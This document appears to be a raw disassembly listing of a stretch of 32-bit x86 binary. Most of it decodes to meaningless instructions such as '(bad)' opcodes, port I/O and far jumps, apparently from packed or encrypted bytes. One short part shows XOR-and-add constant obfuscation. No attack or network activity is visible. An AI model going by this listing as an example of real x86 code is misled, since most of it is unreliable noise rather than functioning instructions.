  41b07c:	cmp    al,0xef
  41b07e:	ret    
  41b07f:	xor    eax,0x249db874
  41b084:	ss loope 0x41b054
  41b087:	add    ebx,DWORD PTR [ecx-0x7b]
  41b08a:	adc    esi,DWORD PTR [edx+0xa]
  41b08d:	mov    fs,WORD PTR ds:0x863e6d2c
  41b093:	sub    eax,0xfb78a611
  41b098:	repnz mov dh,0x2
  41b09b:	test   BYTE PTR [ebx+0x40],al
  41b09e:	add    BYTE PTR [edi+0xdefcde6],ah
  41b0a4:	out    0xeb,al
  41b0a6:	lahf   
  41b0a7:	mov    eax,edx
  41b0a9:	dec    esi
  41b0aa:	push   0x38
  41b0ac:	pop    edx
  41b0ad:	mov    ah,0x57
  41b0af:	push   gs
  41b0b1:	jmp    FWORD PTR [edi]
  41b0b3:	aam    0xcf
  41b0b5:	dec    esi
  41b0b6:	test   al,0x3d
  41b0b8:	fimul  WORD PTR [ecx+0x56]
  41b0bb:	cs test al,0xa1
  41b0be:	sbb    edx,DWORD PTR [edx-0x22]
  41b0c1:	xchg   esi,eax
  41b0c2:	fmul   DWORD PTR [edi+0x3a1569c]
  41b0c8:	xchg   edx,eax
  41b0c9:	xor    al,0x46
  41b0cb:	ja     0x41b0f9
  41b0cd:	mov    ah,0x9e
  41b0cf:	xor    al,0xcd
  41b0d1:	and    al,0x72
  41b0d3:	and    ch,BYTE PTR [edi]
  41b0d5:	test   al,0x13
  41b0d7:	mov    bl,0x79
  41b0d9:	cmp    al,bl
  41b0db:	adc    al,0x7e
  41b0dd:	mov    ebx,0xed146c02
  41b0e2:	mov    edx,0x5448b381
  41b0e7:	arpl   WORD PTR [edi+0x4c],di
  41b0ea:	and    DWORD PTR [ebx+0x27029190],esp
  41b0f0:	ret    0x4c9e
  41b0f3:	cdq    
  41b0f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0f5:	xchg   ebx,eax
  41b0f6:	fiadd  DWORD PTR ds:0x5d60c656
  41b0fc:	test   eax,0x92889cb8
  41b101:	pusha  
  41b102:	mov    esp,0x339481d4
  41b107:	sub    bh,BYTE PTR [ebp-0x5a]
  41b10a:	xor    BYTE PTR [edx-0x1f],dh
  41b10d:	or     ah,BYTE PTR [esi+0x3d17ae2f]
  41b113:	mov    ebx,0xcdc000c2
  41b118:	xrelease mov DWORD PTR [esp+eax*2-0x48],eax
  41b11d:	aam    0x32
  41b11f:	push   0xa9e20b77
  41b124:	dec    esp
  41b125:	push   esp
  41b126:	dec    edi
  41b127:	inc    edi
  41b128:	rcr    BYTE PTR [edi],cl
  41b12a:	test   al,0x28
  41b12c:	sti    
  41b12d:	lds    esi,FWORD PTR [ebx+0x5e]
  41b130:	jns    0x41b0fe
  41b132:	mov    cs,WORD PTR [edi]
  41b134:	cmp    DWORD PTR [eax+ebp*2+0x429189ae],esi
  41b13b:	cmp    eax,0x236fa306
  41b140:	adc    BYTE PTR [eax+ecx*4],ah
  41b143:	and    al,0xe4
  41b145:	push   0xffffffd7
  41b147:	(bad)  
  41b148:	leave  
  41b149:	inc    esp
  41b14a:	push   cs
  41b14b:	cli    
  41b14c:	fcmove st,st(6)
  41b14e:	(bad)  
  41b150:	je     0x41b1ca
  41b152:	dec    esi
  41b153:	xor    BYTE PTR [ebx],cl
  41b155:	mov    cl,0x81
  41b157:	js     0x41b12b
  41b159:	test   al,0xa6
  41b15b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b15c:	and    al,0x9d
  41b15e:	xchg   esi,eax
  41b15f:	sub    dh,BYTE PTR [edi-0x11]
  41b162:	in     eax,0x66
  41b164:	inc    esi
  41b165:	test   DWORD PTR [edx+0x10],edi
  41b168:	(bad)  
  41b169:	xchg   ebx,eax
  41b16a:	push   ebp
  41b16b:	pop    edx
  41b16c:	mov    bh,0x55
  41b16e:	push   cs
  41b16f:	xchg   esi,eax
  41b170:	addr16 pop esp
  41b172:	stos   DWORD PTR es:[edi],eax
  41b173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b174:	xor    eax,0xa7e15b56
  41b179:	outs   dx,BYTE PTR ds:[esi]
  41b17a:	jmp    0xf897:0x2c13df30
  41b181:	(bad)  
  41b184:	push   ebp
  41b185:	xchg   ecx,eax
  41b186:	jp     0x41b1a5
  41b188:	rcr    BYTE PTR [esi+edx*8+0x13],1
  41b18c:	dec    edi
  41b18d:	inc    ecx
  41b18e:	and    edx,DWORD PTR [esi]
  41b190:	mov    eax,0x43c3a674
  41b195:	lea    ecx,[ecx-0x277b68f8]
  41b19b:	fst    DWORD PTR ds:0x955e0720
  41b1a1:	es jge 0x41b13f
  41b1a4:	xor    eax,0x94b43f87
  41b1a9:	and    DWORD PTR [esi],esi
  41b1ab:	in     al,0x5
  41b1ad:	in     al,0x4a
  41b1af:	pusha  
  41b1b0:	icebp  
  41b1b1:	or     al,0xb8
  41b1b3:	sub    dl,bl
  41b1b5:	ret    
  41b1b6:	lods   eax,DWORD PTR ds:[esi]
  41b1b7:	f2xm1  
  41b1b9:	or     ah,BYTE PTR [ebx]
  41b1bb:	xchg   ebx,eax
  41b1bc:	push   ecx
  41b1bd:	xor    dh,dh
  41b1bf:	bound  esi,QWORD PTR [ecx+0xc]
  41b1c2:	pop    ss
  41b1c3:	ror    DWORD PTR [edi-0x2e],cl
  41b1c6:	jmp    0xc1e3:0x3036ec2d
  41b1cd:	imul   esi,DWORD PTR [esi-0x480bcf84],0x4dbd04a0
  41b1d7:	cli    
  41b1d8:	cli    
  41b1d9:	inc    DWORD PTR [eax]
  41b1db:	inc    edx
  41b1dc:	ret    0xb7eb
  41b1df:	ja     0x41b191
  41b1e1:	add    DWORD PTR [ecx+ecx*2-0x75],esi
  41b1e5:	inc    ebp
  41b1e6:	in     al,0xe9
  41b1e8:	xor    BYTE PTR [edx],al
  41b1ea:	add    BYTE PTR [eax],al
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	addr16 ss rcl ch,0x15
  41b1fa:	mov    ecx,0x7fdc28dd
  41b1ff:	js     0x41b211
  41b201:	jle    0x41b27b
  41b203:	js     0x41b1da
  41b205:	shl    cl,cl
  41b207:	mov    DWORD PTR [ebx],esp
  41b209:	jnp    0x41b247
  41b20b:	shl    BYTE PTR [edi-0x61bc473f],1
  41b211:	mov    eax,0x9fa9af3b
  41b216:	daa    
  41b217:	sahf   
  41b218:	inc    ecx
  41b219:	or     eax,DWORD PTR [esi+eax*1+0x7affed19]
  41b220:	or     edi,ebx
  41b222:	jnp    0x41b1ae
  41b224:	or     al,0xa1
  41b226:	pusha  
  41b227:	xchg   ebx,eax
  41b228:	jno    0x41b209
  41b22a:	jge    0x41b1cd
  41b22c:	xlat   BYTE PTR ds:[ebx]
  41b22d:	and    dh,BYTE PTR [ebx+0x4c]
  41b230:	pop    esi
  41b231:	mov    ds:0x1814b908,eax
  41b236:	mov    ecx,ebx
  41b238:	test   DWORD PTR [eax],esi
  41b23a:	mov    bh,0x55
  41b23c:	test   al,0x3f
  41b23e:	call   0xa05d:0xe7027e26
  41b245:	popf   
  41b246:	cmp    BYTE PTR [edi+0x426187e9],dh
  41b24c:	imul   esi,edx,0x7812f5a2
  41b252:	lods   eax,DWORD PTR ds:[esi]
  41b253:	jo     0x41b269
  41b255:	call   0xc2e87e4
  41b25a:	test   ebx,0x16d828ad
  41b260:	or     ah,BYTE PTR [esi]
  41b262:	add    dh,BYTE PTR [eax-0x2f0f0a6a]
  41b268:	fsub   st(2),st
  41b26a:	fsub   QWORD PTR [edx-0x16]
  41b26d:	sar    BYTE PTR [edi-0x3],cl
  41b270:	in     eax,dx
  41b271:	mov    eax,ds:0xac56c648
  41b276:	out    0xa5,eax
  41b278:	scas   eax,DWORD PTR es:[edi]
  41b279:	das    
  41b27a:	push   0xadfb8138
  41b27f:	loop   0x41b297
  41b281:	aam    0x52
  41b283:	or     esi,DWORD PTR [eax-0x14141012]
  41b289:	mov    ch,0xa1
  41b28b:	pop    eax
  41b28c:	fsubr  DWORD PTR [edx-0x16]
  41b290:	pushf  
  41b291:	inc    edi
  41b292:	stos   BYTE PTR es:[edi],al
  41b293:	sbb    edi,DWORD PTR [edx-0x4b]
  41b296:	push   ebx
  41b297:	shr    BYTE PTR [ecx+0x6acd9250],0x8d
  41b29e:	in     al,dx
  41b29f:	cli    
  41b2a0:	rcl    BYTE PTR [ebx-0x24219b65],0x94
  41b2a7:	sar    DWORD PTR [edi+0x24d925ee],cl
  41b2ad:	ror    ah,0xf6
  41b2b0:	dec    ecx
  41b2b1:	push   ecx
  41b2b2:	rol    DWORD PTR [eax],1
  41b2b4:	xchg   ecx,eax
  41b2b5:	mov    cl,BYTE PTR [edx+eax*4-0x74]
  41b2b9:	(bad)  
  41b2ba:	cmp    dh,BYTE PTR [esi]
  41b2bc:	pop    esi
  41b2bd:	ins    DWORD PTR es:[edi],dx
  41b2be:	mov    edi,DWORD PTR [edi]
  41b2c0:	jns    0x41b2f4
  41b2c2:	sub    al,0x47
  41b2c4:	mul    cl
  41b2c6:	mov    DWORD PTR [ecx+0x7],0xe0aef04a
  41b2cd:	sbb    ebp,DWORD PTR [esi]
  41b2cf:	fwait
  41b2d0:	and    al,0x59
  41b2d2:	push   ebx
  41b2d3:	mov    esi,0xe3226659
  41b2d8:	je     0x41b2ed
  41b2da:	mov    WORD PTR [ebx+0x6a],cs
  41b2dd:	mov    al,0x91
  41b2df:	(bad)  
  41b2e0:	out    0x5a,eax
  41b2e2:	addr16 icebp 
  41b2e4:	stos   DWORD PTR es:[edi],eax
  41b2e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2e6:	xchg   ebp,eax
  41b2e7:	dec    ebx
  41b2e8:	outs   dx,DWORD PTR ds:[esi]
  41b2e9:	jl     0x41b2fe
  41b2eb:	lea    esi,[eax+0xe472494]
  41b2f1:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41b2f3:	xchg   esi,eax
  41b2f4:	ins    BYTE PTR es:[edi],dx
  41b2f5:	dec    ebp
  41b2f6:	or     ebx,DWORD PTR [ebx+ebx*2]
  41b2f9:	test   al,0xb9
  41b2fb:	aad    0x94
  41b2fd:	cmp    cl,BYTE PTR [edx]
  41b2ff:	push   ecx
  41b300:	xchg   ebp,eax
  41b301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b302:	add    eax,0x9cd847e8
  41b307:	loopne 0x41b2af
  41b309:	pusha  
  41b30a:	mov    edx,DWORD PTR [ecx]
  41b30c:	pushf  
  41b30d:	in     al,dx
  41b30e:	popf   
  41b30f:	push   ecx
  41b310:	arpl   WORD PTR [ecx],bp
  41b312:	mov    al,ds:0x56329603
  41b317:	sub    al,0x85
  41b319:	add    ah,dl
  41b31b:	(bad)  
  41b31c:	rcr    ch,1
  41b31e:	mov    ds:0x86e51a44,al
  41b323:	jl     0x41b306
  41b325:	scas   al,BYTE PTR es:[edi]
  41b326:	out    dx,al
  41b327:	shl    BYTE PTR [eax-0xd66b563],1
  41b32d:	(bad)  
  41b32e:	out    0x9f,al
  41b330:	pop    esp
  41b331:	stos   BYTE PTR es:[edi],al
  41b332:	sub    DWORD PTR [esi-0x32],edi
  41b335:	cmp    edi,DWORD PTR [ecx+0x4a]
  41b338:	lods   eax,DWORD PTR ds:[esi]
  41b339:	jp     0x41b341
  41b33b:	and    eax,0x35d59c76
  41b340:	mov    edi,0xaa0a362b
  41b345:	mov    dh,0x58
  41b347:	push   0xffffffe0
  41b349:	shl    DWORD PTR [edi+0x23],cl
  41b34c:	out    0x3,eax
  41b34e:	pop    ss
  41b34f:	out    0x15,eax
  41b351:	xor    al,0x40
  41b353:	mov    ah,0x7
  41b355:	daa    
  41b356:	mov    eax,ds:0x417cb35f
  41b35b:	pushf  
  41b35c:	arpl   WORD PTR [ebx+0x8fd9715],cx
  41b362:	inc    esp
  41b363:	cli    
  41b364:	mov    esi,0x4228ad21
  41b369:	cld    
  41b36a:	push   0xfffffff9
  41b36c:	pop    edx
  41b36d:	mov    WORD PTR [edx+0x7fe8c812],fs
  41b373:	sbb    eax,0x5fcba6d0
  41b378:	les    eax,FWORD PTR [eax+0x5815141e]
  41b37e:	push   es
  41b37f:	xor    al,cl
  41b381:	(bad)  
  41b382:	sub    dl,BYTE PTR [ebx-0x52374798]
  41b388:	and    DWORD PTR [eax+edx*1],esi
  41b38b:	sub    BYTE PTR [edi+0x29be4b46],0x43
  41b392:	add    DWORD PTR [ebx-0x27deb6ad],eax
  41b398:	fstp   DWORD PTR [edx+0x38120f8c]
  41b39e:	add    ebp,ebx
  41b3a0:	addr16 std 
  41b3a2:	mov    ah,0x1f
  41b3a4:	dec    DWORD PTR [ecx-0x13]
  41b3a7:	push   eax
  41b3a8:	dec    edi
  41b3a9:	sbb    al,0x96
  41b3ab:	jge    0x41b41f
  41b3ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3ae:	mov    esi,0xeb8ef593
  41b3b3:	mov    ds:0xea93612,al
  41b3b8:	aad    0x74
  41b3ba:	mov    eax,0x32b80aba
  41b3bf:	js     0x41b3a4
  41b3c1:	call   0x3c5d:0x28a7064c
  41b3c8:	xchg   ecx,eax
  41b3c9:	out    0xd3,eax
  41b3cb:	adc    DWORD PTR [esi],esp
  41b3cd:	mov    bh,0xbf
  41b3cf:	out    0x8,eax
  41b3d1:	jl     0x41b3f7
  41b3d3:	pop    ds
  41b3d4:	jmp    0x41b3b7
  41b3d6:	xchg   ebx,edx
  41b3d8:	dec    ecx
  41b3d9:	cmp    al,0x9f
  41b3db:	sub    ebx,DWORD PTR [edx+0x697c34f0]
  41b3e1:	jne    0x41b3c2
  41b3e3:	jp     0x41b3cc
  41b3e5:	sbb    ch,BYTE PTR [ebx-0x5fd34f89]
  41b3eb:	js     0x41b41e
  41b3ed:	scas   eax,DWORD PTR es:[edi]
  41b3ee:	mov    ds:0xee6d2c57,eax
  41b3f3:	pushf  
  41b3f4:	fld    DWORD PTR [ebp-0x6d]
  41b3f7:	mov    ebp,0xdbae307b
  41b3fc:	repz fs dec esi
  41b3ff:	lods   al,BYTE PTR ds:[esi]
  41b400:	gs mov bh,bh
  41b403:	test   eax,0x93029de6
  41b408:	pop    esi
  41b409:	ins    BYTE PTR es:[edi],dx
  41b40a:	dec    esp
  41b40b:	cli    
  41b40c:	add    DWORD PTR [ebx-0x71],0xffffffd7
  41b410:	push   ebp
  41b411:	cmp    bl,dl
  41b413:	iret   
  41b414:	ret    0x9b01
  41b417:	sub    BYTE PTR [esp+edx*4-0x50f04425],ch
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	sub    al,0xf8
  41b4bb:	mov    esp,0x7fe2c0f9
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b4f6
  41b4c6:	inc    DWORD PTR [edx+0x4e]
  41b4c9:	rcr    edi,0xb
  41b4cc:	inc    ebx
  41b4cd:	mov    WORD PTR [esi-0x14fc5070],es
  41b4d3:	retf   0x73ce
  41b4d6:	add    ebp,DWORD PTR [ebx]
  41b4d8:	xchg   edi,eax
  41b4d9:	(bad)  
  41b4db:	push   ss
  41b4dc:	jb     0x41b4c7
  41b4de:	inc    ebp
  41b4df:	rol    DWORD PTR [edi+0x39],0xcd
  41b4e3:	fstp   TBYTE PTR [ebp-0x588983fe]
  41b4e9:	stos   DWORD PTR es:[edi],eax
  41b4ea:	scas   eax,DWORD PTR es:[edi]
  41b4eb:	pop    eax
  41b4ec:	inc    DWORD PTR [edi+0x6c]
  41b4ef:	lods   al,BYTE PTR ds:[esi]
  41b4f0:	imul   BYTE PTR ds:0xfab2a85
  41b4f6:	fsub   DWORD PTR [ecx+0x47]
  41b4f9:	mov    cl,0xba
  41b4fb:	dec    ecx
  41b4fc:	push   ecx
  41b4fd:	je     0x41b50f
  41b4ff:	in     eax,0x5
  41b501:	xor    eax,0x15bf3150
  41b506:	clc    
  41b507:	lods   al,BYTE PTR ds:[esi]
  41b508:	mov    ch,0x98
  41b50a:	retf   
  41b50b:	xor    edi,esi
  41b50d:	push   ebx
  41b50e:	mov    BYTE PTR [eax],ch
  41b510:	adc    BYTE PTR [eax],al
  41b512:	or     al,0x36
  41b514:	test   eax,0xe459b7ab
  41b519:	(bad)  [edi]
  41b51b:	outs   dx,DWORD PTR ds:[esi]
  41b51c:	adc    ah,bl
  41b51e:	out    0x45,eax
  41b520:	je     0x41b4ec
  41b522:	scas   al,BYTE PTR es:[edi]
  41b523:	aam    0xf6
  41b525:	call   DWORD PTR [ebx+eax*2]
  41b528:	fld    QWORD PTR [esi-0x5c]
  41b52b:	lock das 
  41b52d:	nop
  41b52e:	push   0x5d
  41b530:	mov    ds:0x69685975,al
  41b535:	int    0x49
  41b537:	mov    ebx,0x5eb85b0b
  41b53c:	loopne 0x41b596
  41b53e:	cmp    esp,ecx
  41b540:	xchg   ebp,eax
  41b541:	cmp    edx,DWORD PTR [eax+0x45]
  41b544:	inc    ebx
  41b545:	mov    ebx,0x6552e402
  41b54a:	es mov dl,0xf9
  41b54d:	addr16 (bad) 
  41b550:	test   al,0x8c
  41b552:	fwait
  41b553:	cs xchg ecx,eax
  41b555:	jo     0x41b4f8
  41b557:	add    eax,0x41b15d39
  41b55c:	mov    ds:0x35e33f66,al
  41b561:	adc    ah,al
  41b563:	sub    dh,BYTE PTR [edi]
  41b565:	xor    eax,0x2119b00a
  41b56a:	pushf  
  41b56b:	into   
  41b56c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b56d:	xor    al,BYTE PTR [esi+esi*4-0x1eb2b71f]
  41b574:	and    eax,0xddcb7030
  41b579:	call   0x1279:0x5b18388f
  41b580:	in     al,dx
  41b581:	call   0x7ecb:0x88276d58
  41b588:	cmp    eax,0x44c32c3b
  41b58d:	xor    al,0xff
  41b58f:	popa   
  41b590:	mov    al,ds:0x7e306dea
  41b595:	add    edi,DWORD PTR [edi*4-0x7364b562]
  41b59c:	in     eax,dx
  41b59d:	adc    al,0x3a
  41b59f:	cdq    
  41b5a0:	es jne 0x41b5dd
  41b5a3:	mov    ds:0x495c11b0,al
  41b5a8:	add    DWORD PTR [ebx-0x2e3abc9f],esi
  41b5ae:	ja     0x41b5fb
  41b5b0:	mov    WORD PTR [esi-0x552e3f4b],ss
  41b5b6:	scas   al,BYTE PTR es:[edi]
  41b5b7:	fisub  WORD PTR [ebx-0x1bf54a4d]
  41b5bd:	repnz int3 
  41b5bf:	mov    al,ds:0x75fd6153
  41b5c4:	in     eax,0xef
  41b5c6:	mov    bh,0x4e
  41b5c8:	sbb    al,0xb5
  41b5ca:	sub    DWORD PTR [edx],esp
  41b5cc:	dec    edi
  41b5cd:	mov    dh,BYTE PTR [eax-0x39f96573]
  41b5d3:	inc    ecx
  41b5d4:	and    ch,al
  41b5d6:	pushf  
  41b5d7:	fistp  WORD PTR [eax+0x45]
  41b5da:	js     0x41b5c7
  41b5dc:	mov    dh,0x6f
  41b5de:	(bad)  
  41b5df:	cmp    dh,bl
  41b5e1:	lea    edx,[ebx+0x41881982]
  41b5e7:	or     edx,ebp
  41b5e9:	xor    eax,0x9e3530d4
  41b5ee:	xchg   BYTE PTR [edi-0x339ba126],dh
  41b5f4:	inc    esi
  41b5f5:	mov    dh,0xd6
  41b5f7:	je     0x41b623
  41b5f9:	xchg   ecx,eax
  41b5fa:	sbb    DWORD PTR [esi-0x21d87049],ecx
  41b600:	loop   0x41b61c
  41b602:	pop    esp
  41b603:	daa    
  41b604:	xor    ecx,DWORD PTR [esi+0x63]
  41b607:	mov    edi,0xa0b859f4
  41b60c:	out    0xe6,eax
  41b60e:	xchg   ebp,eax
  41b60f:	xor    DWORD PTR ds:0xc920349d,edi
  41b615:	int    0x8d
  41b617:	enter  0xf65c,0x6a
  41b61b:	hlt    
  41b61c:	mov    bh,0x65
  41b61e:	call   FWORD PTR [esi-0x65]
  41b621:	or     edx,ebx
  41b623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b624:	pushf  
  41b625:	(bad)  
  41b626:	ror    DWORD PTR [esi],cl
  41b628:	leave  
  41b629:	adc    eax,DWORD PTR [edi+0x6d3d4085]
  41b62f:	enter  0x6afd,0xa2
  41b633:	add    eax,0x140ad60a
  41b638:	or     DWORD PTR ds:0x7668f6da,esp
  41b63e:	mov    BYTE PTR [esi],dl
  41b640:	loopne 0x41b663
  41b642:	sub    ebp,DWORD PTR [ebp-0x15]
  41b645:	push   ds
  41b646:	ret    
  41b647:	sbb    DWORD PTR [esi],esi
  41b649:	and    al,0x32
  41b64b:	add    BYTE PTR [ebx-0xf],bl
  41b64e:	push   eax
  41b64f:	call   0x94ce:0x5067f65b
  41b656:	call   0x21f3:0x5eb00723
  41b65d:	jo     0x41b604
  41b65f:	lahf   
  41b660:	dec    ebx
  41b661:	xor    eax,0x77fc4f38
  41b666:	xchg   ecx,eax
  41b667:	outs   dx,BYTE PTR ds:[esi]
  41b668:	sub    al,BYTE PTR [edx+0x14b6c0da]
  41b66e:	call   0xbbb0:0x2a99b163
  41b675:	cmc    
  41b676:	inc    ebx
  41b677:	fimul  WORD PTR [ecx+0x50927072]
  41b67d:	xor    al,0x6e
  41b67f:	stos   BYTE PTR es:[edi],al
  41b680:	shl    edi,1
  41b682:	imul   ebp,DWORD PTR [edi-0x7702e685],0xbfae17d1
  41b68c:	sbb    bl,BYTE PTR [ebp+0x2c]
  41b68f:	fidivr DWORD PTR [ecx]
  41b691:	ja     0x41b6ea
  41b693:	xlat   BYTE PTR ds:[ebx]
  41b694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b695:	xchg   ecx,eax
  41b696:	aam    0x2a
  41b698:	(bad)  
  41b699:	mov    edx,0x203089a0
  41b69e:	lock ret 0xeddb
  41b6a2:	movq   mm5,mm0
  41b6a5:	fcomi  st,st(1)
  41b6a7:	rcl    BYTE PTR ds:0x4e416dd3,0x49
  41b6ae:	stc    
  41b6af:	xor    ah,0xc6
  41b6b2:	fld    DWORD PTR [edi]
  41b6b4:	push   ecx
  41b6b5:	jecxz  0x41b712
  41b6b7:	test   al,0xd
  41b6b9:	pop    edx
  41b6ba:	ficomp WORD PTR [esp+edx*2-0x35]
  41b6be:	loope  0x41b6d7
  41b6c0:	adc    DWORD PTR [edi-0x1cef9e7a],0xfe68066e
  41b6ca:	jb     0x41b64c
  41b6cc:	aam    0x93
  41b6ce:	adc    DWORD PTR [edi-0x17],0x4187b757
  41b6d5:	jmp    0x41b69b
  41b6d7:	inc    esi
  41b6d8:	adc    eax,0xddc1bfed
  41b6dd:	xor    eax,ecx
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx+0x2eb268f6]
  41b6f4:	adc    dh,cl
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6a3
  41b6ff:	mov    bh,0x4f
  41b701:	js     0x41b6bf
  41b703:	les    esi,FWORD PTR [edx]
  41b705:	sbb    dh,BYTE PTR [edi]
  41b707:	icebp  
  41b708:	cmc    
  41b709:	jb     0x41b77a
  41b70b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b70c:	(bad)  
  41b70d:	adc    edx,DWORD PTR [edx]
  41b70f:	or     al,0x36
  41b711:	cmp    eax,0x1f340445
  41b716:	lds    esp,FWORD PTR [esi-0x7f]
  41b719:	sub    eax,0xeed74792
  41b71e:	(bad)  
  41b71f:	stos   DWORD PTR es:[edi],eax
  41b720:	push   es
  41b721:	jbe    0x41b71f
  41b723:	ret    0x8923
  41b726:	mov    eax,0x98447e6
  41b72b:	fs xchg edi,eax
  41b72d:	mov    cl,0xb5
  41b72f:	test   eax,0x5f765dcb
  41b734:	inc    esp
  41b735:	ins    BYTE PTR es:[edi],dx
  41b736:	jb     0x41b776
  41b738:	mov    esp,0x38c0f6b9
  41b73e:	pop    edi
  41b73f:	or     BYTE PTR [ecx+0x54423a65],bl
  41b745:	fstp   DWORD PTR [ebx+0x55]
  41b748:	jmp    0x41b719
  41b74a:	imul   ecx,DWORD PTR [ebx-0x41],0xe16503ae
  41b751:	out    0xb6,al
  41b753:	icebp  
  41b754:	aas    
  41b755:	cmp    ah,ah
  41b757:	fimul  DWORD PTR [eax-0x5eb1fc71]
  41b75d:	jbe    0x41b6e8
  41b75f:	ret    0x86e1
  41b762:	test   eax,0xb38c8757
  41b767:	mov    eax,0x1621a924
  41b76c:	icebp  
  41b76d:	push   ss
  41b76e:	push   edx
  41b76f:	stc    
  41b770:	lds    edi,FWORD PTR [eax-0x687f02ea]
  41b776:	jbe    0x41b7a1
  41b778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b779:	mov    ebp,DWORD PTR [esi+0x30696dec]
  41b77f:	mov    edx,0x1433996
  41b784:	aad    0x23
  41b786:	cwde   
  41b787:	test   DWORD PTR ds:0x9d8a9367,ebp
  41b78d:	jno    0x41b74a
  41b78f:	(bad)  
  41b790:	ins    DWORD PTR es:[edi],dx
  41b791:	(bad)  
  41b792:	aad    0xca
  41b794:	cld    
  41b795:	push   0x3958a2f4
  41b79a:	push   eax
  41b79b:	xor    al,0x18
  41b79d:	loope  0x41b7c1
  41b79f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7a0:	add    esi,DWORD PTR [edi-0x11]
  41b7a3:	xor    BYTE PTR [esi],0x40
  41b7a6:	pusha  
  41b7a7:	fxch   st(4)
  41b7a9:	push   edi
  41b7aa:	jg     0x41b815
  41b7ac:	xor    al,0x8a
  41b7ae:	ins    BYTE PTR es:[edi],dx
  41b7af:	dec    esi
  41b7b0:	lods   al,BYTE PTR ds:[esi]
  41b7b1:	pop    ds
  41b7b2:	stc    
  41b7b3:	jge    0x41b744
  41b7b5:	cmc    
  41b7b6:	enter  0xaee9,0x12
  41b7ba:	mov    ebx,0x759a418b
  41b7bf:	(bad)  
  41b7c1:	retf   0x4f6
  41b7c4:	popa   
  41b7c5:	push   0xffffffdc
  41b7c7:	aas    
  41b7c8:	push   ebx
  41b7c9:	adc    eax,0xa0d15168
  41b7ce:	mov    ecx,0xf6d35b6a
  41b7d3:	imul   eax,edi,0x47
  41b7d6:	or     BYTE PTR [ebp+ebx*4-0x5f56f068],cl
  41b7dd:	jns    0x41b781
  41b7df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7e0:	add    cl,BYTE PTR [edi-0x59998b21]
  41b7e6:	mov    ecx,0xb34d069c
  41b7eb:	jecxz  0x41b7f9
  41b7ed:	sbb    eax,0x1ab805c6
  41b7f2:	pushf  
  41b7f3:	jp     0x41b780
  41b7f5:	sbb    edi,DWORD PTR [esi-0x68aad09a]
  41b7fb:	call   0xfa653d8e
  41b800:	fdivr  st(1),st
  41b802:	call   DWORD PTR ds:0x156a4813
  41b808:	out    0xf8,al
  41b80a:	pop    es
  41b80b:	aas    
  41b80c:	pop    eax
  41b80d:	inc    esp
  41b80e:	fisub  DWORD PTR [ecx-0x6caba7a7]
  41b814:	inc    ebp
  41b815:	or     eax,0x8d7aa022
  41b81a:	jecxz  0x41b815
  41b81c:	jmp    0xe64239a7
